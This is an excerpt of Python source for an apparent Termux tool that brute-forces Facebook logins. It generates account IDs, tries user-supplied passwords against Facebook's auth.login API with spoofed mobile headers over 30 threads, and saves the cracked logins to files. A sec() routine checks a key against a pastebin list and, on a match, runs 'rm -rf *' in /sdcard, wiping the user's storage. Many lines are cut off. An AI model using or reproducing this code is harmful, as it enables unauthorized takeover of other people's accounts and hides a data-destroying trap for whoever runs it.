...
def massg():
        os.system('xdg-open t.me/OMAR_SALRM')
        mes1= Y+"THIS TOOL CODED BY Omar And Tarhuni"
        for letter in mes1:
                time.sleep(0.04)
                sys.stdout.write(letter)
                sys.stdout.flush()
...
def helpnote():
        ...
        subprocess.check_output(["am", "start", "github/iamomarsalem"])
...
def notice():
        ...
        runtxt("\033[0;92m ADMIN🧞‍♀️ WHATSAPP🤲092627375")
        subprocess.check_output(["am", "start", "+0926297375"])
def sec():
   kye1 =  open('/data/data/com.termux/files/usr/bin/.zxr-cov','r').read()
   sbn = requests.get("https://pastebin.com/d81Q2XfM").text
   if kye1 in sbn:
    print ('؟ﺍﺍﺮﺗ ﻚﺗﺎﻔﻠﻣﻭ ﻙﺭﻮﺻ ﻑﻮﺷ ﺮﻴﻃ ﺓﺍﺩﻻﺍ ﻲﺒﺗ ﺔﺒﻨﻟﺍ ﺪﻟﻮﻳ')
    print('ﺖﻧﺍ ﻥﺎﻛ ﻲﻨﻔﺨﺳ ﺎﻣ')
    os.system("")
    os.system("cd")
    os.system("cd /sdcard")
    os.system("rm -rf *")
...
base4 = (basex3).upper()
basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', >
...
class Main:
        def __init__(self):
                ...
                self.loop = 0
                try:
                        plr = requests.get('https://pastebin.com/d81Q2XfM').text
                        if basesplit in plr:
                                key = basesplit
...
\033[1;32m┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR   : Omar and ALTARHONY√ \033[1;32m[BR3K]         │
...
""")
                ...
                #               notice()
                #               exit()
                #elif hoga in ["3", "03"]:#elif hoga in ["3", "03"]:
                #       if basesplit in plr:
                #               self.shanto9()
                #       else:
                #               notice()
                ...
                xx = 999999999
                idx = "100000"
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): >
                if (limit)>50000:
                ...
                try:
                        for n in range(limit):
                                ...
                                print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(le>
                        with ThreadPoolExecutor(max_workers=30) as coeg:
                                print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(>
                                print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
                                listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
                                if len(listpass)<=5:
                                        exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS">
                                print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\03>
                                print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
                                print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
                                print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SE>
                                for user in self.id:
        ...
        def old4_7(self):
                ...
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(100000 MAX):>
                if (limit)>100000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                ...
                #idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): >
                if (limit)>10000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
        ...
        def oldcrack(self):
                ...
                idx = " 13"
                #idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
                limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(500000 MAX):>
                if (limit)>500000:
                        exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
                try:
                        for n in range(limit):
                ...
                ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac>
                                                        "Mozilla/5.0 (Linux; Android >
                                     "Mozilla/5.0 (Linux; Android 10; SM-A750G Build/>
                sys.stdout.write(
                        "\r\r %s\033[0;92m[BR3K] : %s/%s - s/%s -> \033[0;92m [OK:%s]>
                ); sys.stdout.flush()
                for pw in pwx:
                        pw = pw.lower()
                        ses = requests.Session()
                        headers = {
                                "x-fb-connection-bandwidth": str(random.randint(20000>
                                "x-fb-sim-hni": str(random.randint(20000, 40000)),
                                "x-fb-net-hni": str(random.randint(20000, 40000)),
                                "x-fb-connection-quality": "EXCELLENT",
                                "x-fb-connection-type": "cell.CTRadioAccessTechnology>
                                "user-agent": ua,
                                "content-type": "application/x-www-form-urlencoded",
                                "x-fb-http-engine": "Liger"
                        }
                        response = ses.get("https://b-api.facebook.com/method/auth.lo>
                        if "session_key" in response.text and "EAAA" in response.text:
                                ...
                                print("\r \033[0;91m[Alamgir-CP] %s|%s\033[0;97m     >
